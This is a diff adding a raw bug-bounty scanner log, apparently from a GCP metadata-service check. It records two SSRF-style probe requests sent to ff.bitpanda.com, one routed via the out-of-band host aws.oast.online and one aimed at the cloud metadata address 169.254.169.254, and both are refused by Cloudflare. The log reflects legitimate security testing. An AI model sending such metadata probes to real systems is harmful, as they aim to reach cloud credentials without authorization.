@@ -1,0 +1,48 @@
+[metadata-service-gcp] Dumped HTTP request for http://ff.bitpanda.com
+
+
+GET http://aws.oast.online/computeMetadata/v1/project/ HTTP/1.1
+Host: aws.oast.online
+X-Bug-Bounty: Bugcrowd-eno@bugcrowdninja.com
+Metadata-Flavor: Google
+
+
+[metadata-service-gcp] Dumped HTTP response http://ff.bitpanda.com
+
+HTTP/1.1 409 Conflict
+Content-Length: 16
+CF-RAY: 96a6723c7e6b056e-IAD
+Cache-Control: private, max-age=0, no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Connection: close
+Content-Type: text/plain; charset=UTF-8
+Date: Tue, 05 Aug 2025 12:54:59 GMT
+Expires: Thu, 01 Jan 1970 00:00:01 GMT
+Referrer-Policy: same-origin
+Server: cloudflare
+X-Frame-Options: SAMEORIGIN
+
+error code: 1001
+[metadata-service-gcp] Dumped HTTP request for http://ff.bitpanda.com
+
+
+GET http://169.254.169.254/computeMetadata/v1/project/ HTTP/1.1
+Host: 169.254.169.254
+X-Bug-Bounty: Bugcrowd-eno@bugcrowdninja.com
+Metadata-Flavor: Google
+
+
+[metadata-service-gcp] Dumped HTTP response http://ff.bitpanda.com
+
+HTTP/1.1 403 Forbidden
+Content-Length: 16
+CF-RAY: 96a67241cdcad6a9-IAD
+Cache-Control: private, max-age=0, no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Connection: close
+Content-Type: text/plain; charset=UTF-8
+Date: Tue, 05 Aug 2025 12:55:00 GMT
+Expires: Thu, 01 Jan 1970 00:00:01 GMT
+Referrer-Policy: same-origin
+Server: cloudflare
+X-Frame-Options: SAMEORIGIN
+
+error code: 1003
